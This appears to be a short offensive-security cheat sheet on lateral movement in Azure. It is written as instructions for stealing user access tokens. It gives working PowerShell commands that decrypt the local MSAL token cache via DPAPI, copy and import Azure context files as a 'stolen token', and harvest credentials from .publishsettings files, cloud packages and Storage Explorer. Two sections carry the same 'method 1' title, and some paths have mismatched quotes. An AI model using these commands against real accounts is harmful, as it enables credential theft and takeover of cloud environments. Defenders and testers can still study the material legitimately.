# Lateral movement
## Stealing Azure tokens
- https://github.com/rvrsh3ll/TokenTactics
### User access tokens method 1
#### Save the AzureRmContext.json
```
cp %USERPROFILE%\.Azure\AzureRmContext.json C:\temp\AzureRmContext.json
```

#### Get the authenticated token for the user
```
Add-Type -AssemblyName System.Security; [Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect((([Text.Encoding]::Default).GetBytes((Get-Content -raw "$env:userprofile\AppData\Local\.IdentityService\msal.cache"))), $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
```

#### Save the token into AzureRmContext.json
-  Open AzureRmContext.json file in a notepad and find the line near the end of the file title “CacheData”. It should be null.

#### Import the token
```
Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
```

### User access tokens method 1
#### Save azcontext
```
Save-AzContext -Path C:\Temp\AzureAccessToken.json
```

#### Import the token
```
Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
```

### Visual Studio Code
- Azure Cloud Service Packages (.cspkg)
- Deployment files created by Visual Studio.
- Possible other Azure services integration (SQL, storage, etc.)
- Through cspkg zip files for creds/certs.
- Search Visual Studio Public Directory ```<cloud project directory>\bin\debug\publish```

#### Publish settings in files
- Look for file ```.publishsettings```
- Can contain a Base64 encoded Management Certificate or cleartext credentials
- Save "ManagementCertificate" section into a new .pfx file
- Search the user's Downloads directory and VS projects.

#### Storage explorers
- Windows Credential Manager stores these credentials.
- Azure Storage Explorer for example has a built-in “Developer Tools” function that you can use to set breakpoints while loading the credentials allowing you to view them while unencrypted.
